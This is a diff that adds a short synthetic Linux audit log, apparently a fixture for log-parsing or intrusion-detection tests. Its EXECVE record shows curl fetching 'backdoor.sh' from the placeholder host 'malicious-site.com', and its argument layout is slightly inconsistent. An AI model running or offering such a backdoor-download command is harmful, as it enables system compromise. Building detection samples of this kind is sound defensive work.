@@ -1,0 +1,5 @@
+type=SYSCALL msg=audit(1642260600.456:2001): arch=c000003e syscall=59 success=yes exit=0 a0=7ffd87654321 a1=7ffd87654340 a2=7ffd87654350 a3=0 items=2 ppid=9876 pid=12345 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts1 ses=5 comm="curl" exe="/usr/bin/curl" key=(null)
+type=EXECVE msg=audit(1642260600.456:2001): argc=4 a0="curl" a1="-s" a2="-o" a3="http://malicious-site.com/backdoor.sh"
+type=CWD msg=audit(1642260600.456:2001): cwd="/home/attacker/Downloads"
+type=PATH msg=audit(1642260600.456:2001): item=0 name="/usr/bin/curl" inode=123456 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0
+type=PROCTITLE msg=audit(1642260600.456:2001): proctitle=6375726C002D73002D6F
